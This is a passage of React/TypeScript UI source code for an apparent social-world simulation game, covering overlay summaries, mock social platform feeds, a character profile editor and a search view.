          <div className="ml-auto text-right text-[12px] text-muted"><div className="flex items-center justify-end gap-1"><Clock className="size-3" />{clockTime(a.t)} · {relTime(a.t, now)}</div><div className="flex items-center justify-end gap-1"><Eye className="size-3" />{fmtCount(a.reads)} reads</div></div>
        </div>
        <div className="my-6 h-56 rounded-xl md:h-80" style={{ background: cover(a, o.color) }} />
        <div className="space-y-4 text-[17px] leading-relaxed text-fg/90">{a.body.map((p, i) => <p key={i}>{p}</p>)}</div>
        <div className="mt-6 flex flex-wrap gap-2">{a.reactions.map((r) => <span key={r.emoji} className="rounded-full border border-line bg-surface-2 px-3 py-1 text-[14px]">{r.emoji} <span className="num text-[12px] text-muted">{fmtCount(r.count)}</span></span>)}</div>
        <h3 className="mb-3 mt-8 text-[15px] font-bold">{comments.length} comments</h3>
        <div className="space-y-4">
          {comments.map((c, i) => { const x = who(s, c.authorId); return (
            <div key={i} className="flex gap-3">
              <button onClick={() => go(`/u/${x.id}`)}><Avatar src={x.avatar} size={34} /></button>
              <div className="min-w-0"><div className="flex items-center gap-2 text-[13px]"><NameLine w={x} /><span className="text-muted">@{x.handle} · {relTime(c.t, now)}</span></div><div className="text-[14.5px]">{c.text}</div><div className="mt-1 flex items-center gap-1 text-[11px] text-muted"><Heart className="size-3" />{c.likes}</div></div>
            </div>
          ); })}
        </div>
      </article>
    </div>
  );
}

```

## src/components/views/Overlays.tsx
```tsx
"use client";
import { useEffect } from "react";
import { X } from "lucide-react";
import { dismissBreaking, dismissSummary, useApp, type Summary } from "../store";
import { Money, go } from "../ui";
import type { RippleResult } from "@/lib/sim/engine";
import { fmtCount } from "@/lib/sim/format";

const dur = (ms: number) => { const h = ms / 36e5; return h >= 48 ? `${Math.round(h / 24)} days` : h >= 1 ? `${Math.round(h)} hours` : `${Math.round(ms / 6e4)} minutes`; };

export function AwaySummary({ s }: { s: Summary }) {
  return (
    <div className="fixed inset-0 z-50 grid place-items-center bg-black/70 p-3 backdrop-blur-sm" onClick={dismissSummary}>
      <div className="panel pop max-h-[90vh] w-full max-w-lg overflow-y-auto p-5" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-start justify-between"><div><div className="text-[11px] uppercase tracking-[0.2em] text-gold">While you were away</div><h2 className="text-[22px] font-black leading-tight">{fmtCount(s.messages)} messages while you were away</h2><p className="mt-0.5 text-[12px] text-muted">You were gone {dur(s.to - s.from)}. Everything below was replayed for that time when you came back.</p></div><button aria-label="Close" className="grid size-9 shrink-0 place-items-center rounded-full hover:bg-surface-2" onClick={dismissSummary}><X className="size-5" /></button></div>
        {s.compressed && <p className="mt-1 text-[12px] text-muted">Long absence: older hours were fast-forwarded; the last day was replayed in full.</p>}
        <div className="mt-4 grid grid-cols-2 gap-2 sm:grid-cols-4">
          {[["@god mentions", fmtCount(s.mentions ?? 0)], ["Posts", fmtCount(s.posts)], ["Articles", String(s.articles)], ["Situations", String(s.events)]].map(([k, v]) => <div key={k} className="rounded-xl bg-surface-2 p-2.5"><div className="text-[10px] uppercase text-muted">{k}</div><div className="num text-[18px] font-bold">{v}</div></div>)}
        </div>
        <div className="mt-3 grid grid-cols-3 gap-2 text-[13px]">
          <div className="rounded-xl bg-surface-2 p-2.5"><div className="text-[10px] uppercase text-muted">Net worth</div><Money v={s.netWorthDelta} sign /></div>
          <div className="rounded-xl bg-surface-2 p-2.5"><div className="text-[10px] uppercase text-muted">Followers</div><span className="num text-up">+{fmtCount(Math.max(0, s.followerDelta))}</span></div>
          <div className="rounded-xl bg-surface-2 p-2.5"><div className="text-[10px] uppercase text-muted">Sentiment</div><span className={`num ${s.opinionShift >= 0 ? "text-up" : "text-down"}`}>{s.opinionShift >= 0 ? "+" : ""}{s.opinionShift.toFixed(1)}</span></div>
        </div>
        {s.highlights.length > 0 && <div className="mt-4"><div className="mb-1 text-[11px] font-semibold uppercase tracking-wider text-muted">Highlights</div><ul className="space-y-1.5 text-[14px]">{s.highlights.map((h, i) => <li key={i} className="flex gap-2"><span className="text-gold">◆</span>{h}</li>)}</ul></div>}
        <div className="mt-4 grid gap-3 sm:grid-cols-2">
          <div><div className="mb-1 text-[11px] font-semibold uppercase tracking-wider text-muted">Trended</div>{s.topTopics.map((t) => <button key={t.tag} onClick={() => { dismissSummary(); go(`/chirp/tag/${t.tag}`); }} className="block text-[13px] text-brand">#{t.tag}</button>)}</div>
          <div><div className="mb-1 text-[11px] font-semibold uppercase tracking-wider text-muted">Loudest servers</div>{s.topServers.map((t) => <div key={t.name} className="flex justify-between text-[13px]"><span>{t.name}</span><span className="num text-muted">{fmtCount(t.count)}</span></div>)}</div>
        </div>
        <div className="mt-5 flex items-center justify-between"><span /><button onClick={dismissSummary} className="btn btn-gold">Catch up</button></div>
      </div>
    </div>
  );
}

export function BreakingOverlay({ r }: { r: RippleResult }) {
  useEffect(() => { const t = setTimeout(dismissBreaking, 14000); return () => clearTimeout(t); }, [r]);
  return (
    <div className="fixed inset-0 z-50 grid place-items-center bg-black/80 p-3 backdrop-blur" onClick={dismissBreaking}>
      <div className="shake w-full max-w-xl" onClick={(e) => e.stopPropagation()}>
        <div className="breaking-pulse rounded-t-2xl bg-down px-4 py-2 text-center text-[13px] font-black tracking-[0.3em] text-white">BREAKING POINT</div>
        <div className="panel rounded-t-none border-down/60 p-5">
          <div className="text-[11px] uppercase tracking-wider text-muted">Impact {r.magnitude.toFixed(1)} / 10</div>
          <h2 className="mt-1 text-[24px] font-black leading-tight">{r.headline ?? r.topic.label}</h2>
          <div className="mt-2 inline-block rounded-full bg-gold/15 px-3 py-1 text-[14px] font-bold text-gold">#{r.topic.tag} · #1 trending</div>
          <div className="mt-4 grid grid-cols-3 gap-2 text-center">
            <div className="rounded-xl bg-surface-2 p-2"><div className="num text-[20px] font-bold">{r.servers.length}</div><div className="text-[10px] uppercase text-muted">servers erupting</div></div>
            <div className="rounded-xl bg-surface-2 p-2"><div className="num text-[20px] font-bold">{r.posts}</div><div className="text-[10px] uppercase text-muted">viral posts</div></div>
            <div className="rounded-xl bg-surface-2 p-2"><div className="num text-[20px] font-bold">{r.articles.length}</div><div className="text-[10px] uppercase text-muted">news stories</div></div>
          </div>
          <div className="mt-3 flex flex-wrap gap-1.5">{r.servers.slice(0, 8).map((n) => <span key={n} className="rounded-full border border-line px-2 py-0.5 text-[11px]">{n}</span>)}</div>
          <div className="mt-5 flex flex-wrap items-center gap-2">
            <button onClick={() => { dismissBreaking(); go(`/chirp/tag/${r.topic.tag}`); }} className="btn btn-gold">See the reaction</button>
            {r.articles[0] && <button onClick={() => { dismissBreaking(); go(`/news/${r.articles[0].id}`); }} className="btn">Read coverage</button>}
          </div>
        </div>
      </div>
    </div>
  );
}

export function Toast() {
  const { toast, now } = useApp();
  if (!toast || Math.max(now, toast.t) - toast.t > (toast.ms ?? 3500)) return null;
  return <div className="pop fixed bottom-20 left-1/2 z-50 max-w-[90vw] -translate-x-1/2 rounded-full border border-line bg-surface-3 px-4 py-2 text-[13px] shadow-2xl md:bottom-6">{toast.text}</div>;
}

```

## src/components/views/Platforms.tsx
```tsx
"use client";
import clsx from "clsx";
import { MemeImage } from "../MemeImage";
import { ArrowBigUp, Eye, Heart, MessageSquare, Play, Radio, X } from "lucide-react";
import { PostCard } from "./Chirp";
import type { Route } from "../App";
import { useApp } from "../store";
import { Avatar, NameLine, RichText, go, who } from "../ui";
import { fmtCount, relTime } from "@/lib/sim/format";
import type { PlatformId, Post, WorldState } from "@/lib/sim/types";

const PLATS: { id: PlatformId; name: string; blurb: string; color: string }[] = [
  { id: "snapgram", name: "Snapgram", blurb: "photos & stories", color: "#e0567b" },
  { id: "clipz", name: "Clipz", blurb: "short vertical video", color: "#35d0c3" },
  { id: "threadit", name: "Threadit", blurb: "forums & upvotes", color: "#ff7a3d" },
  { id: "tubeverse", name: "TubeVerse", blurb: "long-form video", color: "#f2555f" },
  { id: "wire", name: "Wire", blurb: "broadcast channels", color: "#4aa8ff" },
];

export function Platforms({ route }: { route: Route }) {
  const { world: w, now } = useApp();
  const s = w!;
  const pid = (PLATS.find((p) => p.id === route.parts[0]) ?? PLATS[0]).id;
  const posts = s.posts.filter((p) => p.platform === pid && p.t <= now && !p.replyTo).slice(-120).reverse();
  const openId = route.query.get("p") ?? undefined;
  return (
    <div className="flex h-full flex-col">
      <div className="no-scrollbar flex shrink-0 gap-2 overflow-x-auto border-b border-line px-3 py-2">
        {PLATS.map((p) => (
          <button key={p.id} onClick={() => go(`/platforms/${p.id}`)} className={clsx("flex shrink-0 items-center gap-2 rounded-full border px-3 py-1.5 text-[13px] font-semibold", pid === p.id ? "border-transparent text-white" : "border-line text-muted")} style={pid === p.id ? { background: p.color } : undefined}>
            {p.name}<span className="hidden text-[11px] font-normal opacity-80 sm:inline">{p.blurb}</span>
          </button>
        ))}
      </div>
      <div className="flex-1 overflow-y-auto p-3 md:p-5">
        {pid === "snapgram" && <div className="grid grid-cols-2 gap-3 md:grid-cols-3 xl:grid-cols-4">{posts.slice(0, 48).map((p) => <Open key={p.id} pid={pid} id={p.id}><Snap s={s} p={p} now={now} /></Open>)}</div>}
        {pid === "clipz" && <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-5">{posts.slice(0, 40).map((p) => <Open key={p.id} pid={pid} id={p.id}><Clip s={s} p={p} /></Open>)}</div>}
        {pid === "threadit" && <div className="mx-auto max-w-3xl space-y-2">{posts.slice(0, 60).map((p) => <Open key={p.id} pid={pid} id={p.id}><Thread s={s} p={p} now={now} /></Open>)}</div>}
        {pid === "tubeverse" && <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-3">{posts.slice(0, 36).map((p) => <Open key={p.id} pid={pid} id={p.id}><Tube s={s} p={p} now={now} /></Open>)}</div>}
        {pid === "wire" && <WireView s={s} posts={posts} now={now} />}
        {!posts.length && <div className="p-8 text-center text-muted">Quiet right now. Check back soon, the world keeps running.</div>}
      </div>
      {openId && <PostSheet s={s} id={openId} pid={pid} now={now} />}
    </div>
  );
}

function Open({ pid, id, children }: { pid: PlatformId; id: string; children: React.ReactNode }) {
  return <div role="button" tabIndex={0} onClick={() => go(`/platforms/${pid}?p=${id}`)} onKeyDown={(e) => { if (e.key === "Enter") go(`/platforms/${pid}?p=${id}`); }} className="block w-full cursor-pointer text-left transition-transform active:scale-[0.99]">{children}</div>;
}

function PostSheet({ s, id, pid, now }: { s: WorldState; id: string; pid: PlatformId; now: number }) {
  const p = s.posts.find((x) => x.id === id);
  const close = () => go(`/platforms/${pid}`);
  const replies = p ? s.posts.filter((x) => x.replyTo === id && x.t <= now).slice(-40) : [];
  return (
    <div className="fixed inset-0 z-50 flex items-end justify-center bg-black/60 backdrop-blur-[2px] md:items-center" onClick={close}>
      <div onClick={(e) => e.stopPropagation()} className="sheet-up max-h-[88vh] w-full max-w-[600px] overflow-y-auto rounded-t-3xl border border-line bg-surface md:rounded-3xl">
        <div className="sticky top-0 z-10 flex items-center justify-between border-b border-line bg-surface/95 px-3 py-2 backdrop-blur">
          <span className="text-[14px] font-bold">{PLATS.find((x) => x.id === pid)?.name}</span>
          <button aria-label="Close" onClick={close} className="grid size-10 place-items-center rounded-full hover:bg-surface-2"><X className="size-5" /></button>
        </div>
        {p ? <PostCard s={s} p={p} now={now} /> : <div className="p-6 text-muted">This post is gone.</div>}
        {replies.map((r) => <PostCard key={r.id} s={s} p={r} now={now} compact />)}
        {p && !replies.length && <div className="p-5 text-center text-[13px] text-muted">{p.replies ? "Older comments aren’t shown here. Reply from the card above to join in." : "No comments yet. Be the first."}</div>}
      </div>
    </div>
  );
}

const grad = (h: number) => `radial-gradient(circle at 30% 25%, hsl(${h} 75% 60%), hsl(${(h + 70) % 360} 65% 20%))`;

function Snap({ s, p, now }: { s: WorldState; p: Post; now: number }) {
  const a = who(s, p.authorId);
  return (
    <div className="panel overflow-hidden">
      <div className="flex items-center gap-2 p-2"><Avatar src={a.avatar} size={26} /><NameLine w={a} className="text-[12px]" /><span className="ml-auto text-[10px] text-muted">{relTime(p.t, now)}</span></div>
      {p.media?.meme ? <MemeImage still m={p.media.meme} id={p.id} className="block aspect-square w-full overflow-hidden [&_svg]:block [&_svg]:h-full [&_svg]:w-full" /> : (
      <div className="relative aspect-square" style={{ background: grad(p.media?.hue ?? 200) }}>
        <span className="absolute bottom-2 left-2 rounded bg-black/50 px-1.5 text-[10px] text-white/80">#{p.media?.label}</span>
      </div>)}
      <div className="p-2.5 text-[12.5px]"><div className="mb-1 flex gap-3 text-muted"><span className="flex items-center gap-1"><Heart className="size-3.5" />{fmtCount(p.likes)}</span><span className="flex items-center gap-1"><MessageSquare className="size-3.5" />{fmtCount(p.replies)}</span></div><span className="font-semibold">{a.handle}</span> <span className="line-clamp-2"><RichText text={p.text} /></span></div>
    </div>
  );
}

function Clip({ s, p }: { s: WorldState; p: Post }) {
  const a = who(s, p.authorId);
  return (
    <div className="relative aspect-[9/16] overflow-hidden rounded-2xl border border-line" style={{ background: grad(p.media?.hue ?? 160) }}>
      <Play className="absolute left-1/2 top-1/2 size-10 -translate-x-1/2 -translate-y-1/2 text-white/70" />
      <div className="absolute inset-x-0 bottom-0 bg-gradient-to-t from-black/90 to-transparent p-2.5 pt-10 text-[12px] text-white">
        <div className="mb-1 flex items-center gap-1.5"><Avatar src={a.avatar} size={20} /><span className="truncate font-semibold">@{a.handle}</span></div>
        <div className="line-clamp-3">{p.text}</div>
        <div className="mt-1 flex items-center gap-1 text-white/70"><Eye className="size-3" />{fmtCount(p.views)}</div>
      </div>
    </div>
  );
}

function Thread({ s, p, now }: { s: WorldState; p: Post; now: number }) {
  const a = who(s, p.authorId);
  const score = Math.round(p.likes / 7 - p.replies / 3);
  return (
    <div className="panel flex gap-3 p-3">
      <div className="flex w-10 shrink-0 flex-col items-center text-[12px] font-bold"><ArrowBigUp className="size-5 text-[#ff7a3d]" /><span className="num">{fmtCount(score)}</span></div>
      <div className="min-w-0">
        <div className="text-[11px] text-muted"><span className="font-semibold text-fg">{p.community ?? "t/AskAnything"}</span> · posted by u/{a.handle} · {relTime(p.t, now)}</div>
        <div className="mt-0.5 font-semibold">{p.title ?? p.text.slice(0, 90)}</div>
        {p.title && <div className="mt-1 line-clamp-3 text-[13.5px] text-fg/85">{p.text}</div>}
        <div className="mt-1.5 text-[12px] text-muted">{fmtCount(p.replies)} comments</div>
      </div>
    </div>
  );
}

function Tube({ s, p, now }: { s: WorldState; p: Post; now: number }) {
  const a = who(s, p.authorId);
  const mins = 4 + (p.views % 37);
  return (
    <div>
      <div className="relative aspect-video overflow-hidden rounded-xl border border-line" style={{ background: grad(p.media?.hue ?? 0) }}>
        <span className="absolute bottom-2 right-2 rounded bg-black/80 px-1 text-[11px] text-white num">{mins}:{String(p.likes % 60).padStart(2, "0")}</span>
        <span className="absolute left-3 top-3 max-w-[80%] text-[18px] font-black uppercase leading-tight text-white [text-shadow:0_2px_0_#000]">{(p.title ?? p.text).split(" ").slice(0, 4).join(" ")}</span>
      </div>
      <div className="mt-2 flex gap-2.5">
        <Avatar src={a.avatar} size={34} />
        <div className="min-w-0"><div className="line-clamp-2 text-[14px] font-semibold">{p.title ?? p.text}</div><div className="text-[12px] text-muted">{a.name} · {fmtCount(p.views)} views · {relTime(p.t, now)}</div></div>
      </div>
    </div>
  );
}

function WireView({ s, posts, now }: { s: WorldState; posts: Post[]; now: number }) {
  return (
    <div className="mx-auto max-w-2xl space-y-3">
      {posts.slice(0, 50).map((p) => { const a = who(s, p.authorId); return (
        <div key={p.id} className="flex gap-3">
          <Avatar src={a.avatar} size={38} />
          <div className="max-w-[85%] rounded-2xl rounded-tl-sm bg-surface-3 px-3.5 py-2.5">
            <div className="flex items-center gap-1.5 text-[12px] font-semibold text-[#4aa8ff]"><Radio className="size-3.5" />{a.name}&apos;s channel</div>
            <div className="mt-0.5 whitespace-pre-wrap text-[14px]"><RichText text={p.text} /></div>
            <div className="mt-1 flex justify-end gap-2 text-[10px] text-muted"><span className="flex items-center gap-0.5"><Eye className="size-3" />{fmtCount(p.views)}</span>{relTime(p.t, now)}</div>
          </div>
        </div>
      ); })}
    </div>
  );
}

```

## src/components/views/Profile.tsx
```tsx
"use client";
import { useEffect, useState } from "react";
import { ArrowLeft, MapPin, Briefcase, Wallet, Clock, Pencil, MessageCircle } from "lucide-react";
import { badgesFor, OBSESSION_INFO, obsessionOf } from "@/lib/sim/social";
import { dmChannel } from "@/lib/sim/godspeak";
import { editWorld, useApp } from "../store";
import { Avatar, NameLine, RichText, Section, StanceChip, go, who } from "../ui";
import { PostCard } from "./Chirp";
import { STANCE_INFO } from "@/lib/sim/characters";
import { localHour, textAt } from "@/lib/sim/engine";
import { fmtCount, relTime } from "@/lib/sim/format";
import type { Character, Stance } from "@/lib/sim/types";

export function ProfileView({ id }: { id: string }) {
  const { world: w, now } = useApp();
  const s = w!;
  const [edit, setEdit] = useState(false);
  useEffect(() => { if (id === "god") go("/dashboard"); }, [id]);
  if (id === "god") return null;
  const x = who(s, id);
  const c = x.char;
  if (!c) return <div className="p-8 text-muted">Unknown profile.</div>;
  const msgs = s.messages.filter((m) => m.authorId === id && !m.deleted && m.t <= now).slice(-12).reverse();
  const ob = OBSESSION_INFO[obsessionOf(c)];
  const badges = badgesFor(c);
  const bond = Math.round(c.bond ?? 0);
  const contacts = (c.godContacts ?? []).slice(-6).reverse();
  const posts = s.posts.filter((p) => p.authorId === id && p.t <= now).slice(-8).reverse();
  const lh = localHour(c, now);
  const srvs = c.servers.map((sid) => s.servers.find((v) => v.id === sid)!).filter(Boolean);
  const op = c.opinion;
  return (
    <div className="h-full overflow-y-auto">
      <div className="h-32 md:h-44" style={{ background: `linear-gradient(120deg, ${STANCE_INFO[c.stance].color}55, var(--surface) 70%)` }} />
      <div className="mx-auto -mt-14 max-w-4xl space-y-4 px-3 pb-8 md:px-6">
        <div className="flex items-end justify-between gap-3">
          <Avatar src={x.avatar} size={104} className="border-4 border-bg" />
          <div className="flex gap-2"><button aria-label="Back" onClick={() => history.back()} className="btn min-h-10"><ArrowLeft className="size-4" /></button><button onClick={() => go(`/lounge/dm/${dmChannel("god", c.id)}`)} className="btn btn-gold min-h-10"><MessageCircle className="size-4" /> Message</button><button onClick={() => setEdit(!edit)} className="btn min-h-10"><Pencil className="size-4" /> {edit ? "Close" : "Edit"}</button></div>
        </div>
        <div>
          <div className="flex flex-wrap items-center gap-2 text-[22px]"><NameLine w={x} /><StanceChip c={c} />{c.edited && <span className="text-[11px] text-muted">(edited)</span>}</div>
          <div className="text-muted">@{c.username} · {fmtCount(c.followers)} followers · {c.tier}</div>
          <div className="mt-1.5 flex flex-wrap gap-1.5">
            {badges.filter((b) => b.label !== ob.label).map((b) => <span key={b.label} className="rounded-full px-2 py-0.5 text-[11px] font-semibold" style={{ background: b.color + "22", color: b.color }}>{b.label}</span>)}
          </div>
          <p className="mt-2 max-w-2xl"><RichText text={c.bio} /></p>
          <div className="mt-2 flex flex-wrap gap-x-4 gap-y-1 text-[13px] text-muted">
            <span className="flex items-center gap-1"><MapPin className="size-3.5" />{c.location}</span>
            <span className="flex items-center gap-1"><Briefcase className="size-3.5" />{c.occupation}, {c.age}</span>
            <span className="flex items-center gap-1"><Wallet className="size-3.5" />{c.finances}</span>
            <span className="flex items-center gap-1"><Clock className="size-3.5" />{String(Math.floor(lh)).padStart(2, "0")}:{String(Math.floor((lh % 1) * 60)).padStart(2, "0")} local · {c.chronotype === "owl" ? "night owl" : c.chronotype === "morning" ? "early bird" : "evenings"}</span>
          </div>
        </div>
        {edit && <Editor c={c} onDone={() => setEdit(false)} />}
        <div className="grid gap-4 md:grid-cols-2">
          <Section title="Opinion of @god">
            <div className="relative h-3 rounded-full bg-gradient-to-r from-down via-surface-3 to-gold"><span className="absolute top-1/2 size-4 -translate-x-1/2 -translate-y-1/2 rounded-full border-2 border-bg bg-fg" style={{ left: `${(op + 100) / 2}%` }} /></div>
            <div className="mt-2 flex justify-between text-[11px] text-muted"><span>can&apos;t stand him</span><span className="num text-fg">{op > 0 ? "+" : ""}{Math.round(op)}</span><span>would die for him</span></div>
            <div className="mt-3 flex items-center gap-2 text-[12px] text-muted"><span>Bond with you</span><div className="h-1.5 flex-1 rounded-full bg-surface-3"><div className="h-full rounded-full bg-gold" style={{ width: `${bond}%` }} /></div><span className="num text-fg">{bond}</span></div>
            {contacts.length > 0 && <div className="mt-2 space-y-1 text-[12px]">{contacts.map((g, i) => <div key={i} className="truncate"><span className="text-gold">●</span> {g.kind === "dm" ? "You DM'd them" : g.kind === "replied" ? "You replied to them" : g.kind === "mentioned" ? "You mentioned them" : "They saw you post"}: <span className="text-fg">&ldquo;{g.text}&rdquo;</span> <span className="text-muted">· {relTime(g.t, now)}</span></div>)}</div>}
            <p className="mt-3 text-[13px] text-muted">Catchphrase: <span className="text-fg">&ldquo;{c.catchphrase}&rdquo;</span></p>
          </Section>
          <Section title="Personality & voice">
            <div className="flex flex-wrap gap-1.5">{c.personality.map((p) => <span key={p} className="rounded-full bg-surface-3 px-2 py-0.5 text-[12px]">{p}</span>)}</div>
            <div className="mt-2 text-[13px] text-muted">Talks <span className="text-fg">{c.voice}</span> · emoji {Math.round(c.emojiRate * 100)}% · {c.emojis.join(" ")} · says {c.slang.slice(0, 4).join(", ") || "—"}</div>
            <div className="mt-1 text-[13px] text-muted">Into: {c.interests.join(", ")}</div>
          </Section>
          <Section title="Relationships">
            <div className="text-[12px] text-muted">Friends</div>
            <div className="mb-2 mt-1 flex flex-wrap gap-1.5">{c.friends.slice(0, 8).map((f) => <Chip key={f} s={s} id={f} />)}</div>
            <div className="text-[12px] text-muted">Rivals</div>
            <div className="mt-1 flex flex-wrap gap-1.5">{c.rivals.slice(0, 6).map((f) => <Chip key={f} s={s} id={f} />)}{!c.rivals.length && <span className="text-[12px] text-muted">none, somehow</span>}</div>
          </Section>
          <Section title="Servers & memory">
            <div className="flex flex-wrap gap-1.5">{srvs.map((v) => <button key={v.id} onClick={() => go(`/lounge/${v.id}`)} className="rounded-full border border-line px-2 py-0.5 text-[12px]">{v.icon} {v.name}{c.nicknames[v.id] ? <span className="text-muted"> as {c.nicknames[v.id]}</span> : null}</button>)}</div>
            <div className="mt-3 space-y-1 text-[12px]">{c.memory.slice(-5).reverse().map((m, i) => <div key={i}><span className={m.feeling >= 0 ? "text-up" : "text-down"}>●</span> remembers {m.label} <span className="text-muted">· {relTime(m.t, now)}</span></div>)}{!c.memory.length && <span className="text-muted">Nothing memorable yet.</span>}</div>
          </Section>
        </div>
        <Section title="Recent messages">
          <div className="space-y-2">{msgs.map((m) => { const srv = s.servers.find((v) => v.id === m.serverId); const ch = srv?.channels.find((h) => h.id === m.channelId); return (
            <button key={m.id} onClick={() => go(`/lounge/${m.serverId}/${m.channelId}?m=${m.id}`)} className="block w-full text-left text-[14px]"><span className="text-[11px] text-muted">{m.serverId === "dm" ? "Direct message" : `${srv?.name} #${ch?.name}`} · {relTime(m.t, now)}</span><div>{textAt(m, now)}</div></button>
          ); })}{!msgs.length && <span className="text-[13px] text-muted">Lurker. Hasn&apos;t said anything recently.</span>}</div>
        </Section>
        {posts.length > 0 && <div className="panel overflow-hidden">{posts.map((p) => <PostCard key={p.id} s={s} p={p} now={now} onOpen={() => go(`/chirp/post/${p.id}`)} />)}</div>}
      </div>
    </div>
  );
}

const Chip = ({ s, id }: { s: Parameters<typeof who>[0]; id: string }) => { const x = who(s, id); return <button onClick={() => go(`/u/${id}`)} className="flex items-center gap-1 rounded-full bg-surface-3 py-0.5 pl-0.5 pr-2 text-[12px]"><Avatar src={x.avatar} size={18} />{x.name}</button>; };

function Editor({ c, onDone }: { c: Character; onDone: () => void }) {
  const [f, setF] = useState({ displayName: c.displayName, bio: c.bio, occupation: c.occupation, location: c.location, catchphrase: c.catchphrase, stance: c.stance, opinion: c.opinion });
  const save = () => { editWorld((w) => { const t = w.characters.find((x) => x.id === c.id)!; Object.assign(t, f, { edited: true }); }); onDone(); };
  const field = (k: "displayName" | "bio" | "occupation" | "location" | "catchphrase", label: string) => (
    <label className="block"><span className="text-[11px] uppercase tracking-wider text-muted">{label}</span><input value={f[k]} onChange={(e) => setF({ ...f, [k]: e.target.value })} className="input mt-1 w-full" /></label>
  );
  return (
    <div className="panel grid gap-3 p-4 sm:grid-cols-2">
      {field("displayName", "Display name")}{field("occupation", "Occupation")}{field("location", "Location")}{field("catchphrase", "Catchphrase")}
      <div className="sm:col-span-2">{field("bio", "Bio")}</div>
      <label className="block"><span className="text-[11px] uppercase tracking-wider text-muted">Stance</span>
        <select value={f.stance} onChange={(e) => setF({ ...f, stance: e.target.value as Stance })} className="input mt-1 w-full">{Object.entries(STANCE_INFO).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}</select></label>
      <label className="block"><span className="text-[11px] uppercase tracking-wider text-muted">Opinion of @god ({Math.round(f.opinion)})</span><input type="range" min={-100} max={100} value={f.opinion} onChange={(e) => setF({ ...f, opinion: Number(e.target.value) })} className="mt-3 w-full" /></label>
      <div className="flex gap-2 sm:col-span-2"><button onClick={save} className="btn btn-gold">Save character</button><button onClick={onDone} className="btn">Cancel</button><span className="self-center text-[11px] text-muted">Their future messages follow the new stance and opinion.</span></div>
    </div>
  );
}

```

## src/components/views/Search.tsx
```tsx
"use client";
import { useState } from "react";
import { Search as SearchIcon } from "lucide-react";
import type { Route } from "../App";
import { useApp } from "../store";
import { Avatar, NameLine, StanceChip, go, who } from "../ui";
import { PostCard } from "./Chirp";
import { textAt } from "@/lib/sim/engine";
import { relTime } from "@/lib/sim/format";

export function SearchView({ route }: { route: Route }) {
  const { world: w, now } = useApp();
  const s = w!;
  const [q, setQ] = useState(route.query.get("q") ?? "");
  const t = q.trim().toLowerCase();
  const chars = t ? s.characters.filter((c) => c.username.includes(t) || c.displayName.toLowerCase().includes(t) || c.occupation.toLowerCase().includes(t) || c.location.toLowerCase().includes(t)).slice(0, 24) : [];
  const servers = t ? s.servers.filter((x) => x.name.toLowerCase().includes(t) || x.description.toLowerCase().includes(t)) : [];
  const topics = t ? s.topics.filter((x) => x.startedAt <= now && (x.tag.toLowerCase().includes(t) || x.label.toLowerCase().includes(t))).slice(-10).reverse() : [];
  const arts = t ? s.articles.filter((a) => a.t <= now && a.headline.toLowerCase().includes(t)).slice(-10).reverse() : [];
  const posts = t ? s.posts.filter((p) => p.t <= now && p.text.toLowerCase().includes(t)).slice(-20).reverse() : [];
  const msgs: typeof s.messages = [];
  if (t.length >= 2) for (let i = s.messages.length - 1; i >= 0 && msgs.length < 20; i--) { const m = s.messages[i]; if (m.t <= now && !m.deleted && m.serverId !== "dm" && m.kind !== "system" && textAt(m, now).toLowerCase().includes(t)) msgs.push(m); }
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-4xl space-y-5 p-3 md:p-6">
        <div className="flex items-center gap-2 rounded-full border border-line bg-surface-2 px-4 py-2.5">
          <SearchIcon className="size-5 text-muted" />
          <input autoFocus value={q} onChange={(e) => { setQ(e.target.value); history.replaceState(null, "", `#/search?q=${encodeURIComponent(e.target.value)}`); }} placeholder="Search people, servers, trends, news, posts…" className="flex-1 bg-transparent outline-none" />
        </div>
        {!t && <p className="text-center text-[13px] text-muted">Try &quot;island&quot;, &quot;crypto&quot;, a city, or a job title.</p>}
        {chars.length > 0 && <Block title="People">{<div className="grid gap-2 sm:grid-cols-2">{chars.map((c) => { const x = who(s, c.id); return (
          <button key={c.id} onClick={() => go(`/u/${c.id}`)} className="panel flex items-center gap-3 p-3 text-left"><Avatar src={x.avatar} size={40} /><div className="min-w-0 flex-1"><NameLine w={x} /><div className="truncate text-[12px] text-muted">@{c.username} · {c.occupation} · {c.location}</div></div><StanceChip c={c} /></button>
        ); })}</div>}</Block>}
        {servers.length > 0 && <Block title="Servers">{servers.map((x) => <button key={x.id} onClick={() => go(`/lounge/${x.id}`)} className="panel mb-2 flex w-full items-center gap-3 p-3 text-left"><span className="grid size-10 place-items-center rounded-xl text-[20px]" style={{ background: x.color }}>{x.icon}</span><div><div className="font-semibold">{x.name}</div><div className="text-[12px] text-muted">{x.description}</div></div></button>)}</Block>}
        {topics.length > 0 && <Block title="Trends">{topics.map((x) => <button key={x.id} onClick={() => go(`/chirp/tag/${x.tag}`)} className="mb-1 block text-left"><span className="font-semibold text-brand">#{x.tag}</span> <span className="text-[13px] text-muted">{x.label}</span></button>)}</Block>}
        {msgs.length > 0 && <Block title="Lounge messages"><div className="panel divide-y divide-line overflow-hidden">{msgs.map((m) => { const x = who(s, m.authorId); const srv = s.servers.find((v) => v.id === m.serverId); const ch = srv?.channels.find((c) => c.id === m.channelId); return (
          <button key={m.id} data-testid="search-msg" onClick={() => go(`/lounge/${m.serverId}/${m.channelId}?m=${m.id}`)} className="flex w-full items-start gap-3 p-3 text-left hover:bg-surface-2"><Avatar src={x.avatar} size={32} /><div className="min-w-0 flex-1"><div className="flex items-baseline gap-2 text-[12px] text-muted"><span className="font-semibold text-text">{x.name}</span><span className="truncate">{srv?.name} #{ch?.name}</span><span className="shrink-0">{relTime(m.t, now)}</span></div><div className="text-[14px] [overflow-wrap:anywhere]">{textAt(m, now)}</div></div></button>
        ); })}</div></Block>}
        {arts.length > 0 && <Block title="News">{arts.map((a) => <button key={a.id} onClick={() => go(`/news/${a.id}`)} className="mb-2 block text-left"><div className="text-[11px] text-muted">{s.outlets.find((o) => o.id === a.outletId)?.name}</div><div className="font-semibold">{a.headline}</div></button>)}</Block>}
        {posts.length > 0 && <Block title="Posts"><div className="panel overflow-hidden">{posts.map((p) => <PostCard key={p.id} s={s} p={p} now={now} compact onOpen={() => go(`/chirp/post/${p.id}`)} />)}</div></Block>}
